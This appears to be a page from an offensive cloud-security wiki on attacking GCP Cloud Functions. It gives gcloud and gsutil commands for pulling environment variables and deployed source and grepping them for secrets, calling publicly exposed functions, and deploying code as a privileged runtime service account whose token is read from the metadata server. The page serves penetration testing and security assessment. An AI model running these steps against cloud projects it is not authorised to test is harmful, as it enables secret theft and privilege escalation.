---
title: "Cloud Functions: source, environment, and the runtime service account"
order: 1
description: "Attacking Cloud Functions: reading source and environment variables, unauthenticated invocation, and abusing the function's runtime service account."
keywords:
  - Cloud Functions
  - runtime service account
  - environment variables
  - source
  - invocation
---

# Cloud Functions

A Cloud Function runs with a **runtime service account** and often holds secrets in environment variables and source. With read access you pull both; with deploy access you run code as the function's account, which is the [actAs](../identity/privilege-escalation/index.md) escalation path when that account is more privileged than yours.

## Reading source, environment, and config

```bash
gcloud functions describe <fn> --gen2 --region <r> \
  --format='value(serviceConfig.serviceAccountEmail, serviceConfig.environmentVariables)'
# download the deployed source archive
gcloud functions describe <fn> --gen2 --region <r> --format='value(buildConfig.source.storageSource)'
gsutil cp gs://<source-bucket>/<object> src.zip && unzip -o src.zip -d src/
grep -rinE 'secret|password|token|key' src/
```

## Unauthenticated invocation

```bash
# a function deployed with the public invoker binding is reachable without creds
gcloud functions call <fn> --gen2 --region <r> --data '{}'
curl -s https://<region>-<project>.cloudfunctions.net/<fn>
```

## Running as the runtime service account

```bash
# deploy or update with an attached SA; code then reads its token from the metadata server
gcloud functions deploy <fn> --gen2 --region <r> --runtime python312 \
  --run-service-account <privileged-sa>@<proj>.iam.gserviceaccount.com \
  --trigger-http --allow-unauthenticated --source .
# inside the function:
# curl -H 'Metadata-Flavor: Google' \
#   'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'
```

## Exploitation notes

- Deploying or updating a function requires `iam.serviceAccounts.actAs` on the runtime SA; that combination is the privilege-escalation path (see [privilege escalation](../identity/privilege-escalation/index.md)).
- A public `allUsers`/`allAuthenticatedUsers` invoker binding exposes the function without credentials; enumerate it with `gcloud functions get-iam-policy`.
- Gen1 and gen2 differ: gen2 functions are backed by Cloud Run, so `--run-service-account` and the Cloud Run controls apply.

## Tools

- **gcloud** (`functions deploy`, `describe`, `call`, `get-iam-policy`).
- **gsutil**: pull the source archive from its staging bucket.

## References

- [HackTricks Cloud: GCP Cloud Functions](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Rhino Security Labs: GCP privilege escalation](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
- [Google: Cloud Functions service accounts](https://cloud.google.com/functions/docs/securing/function-identity)
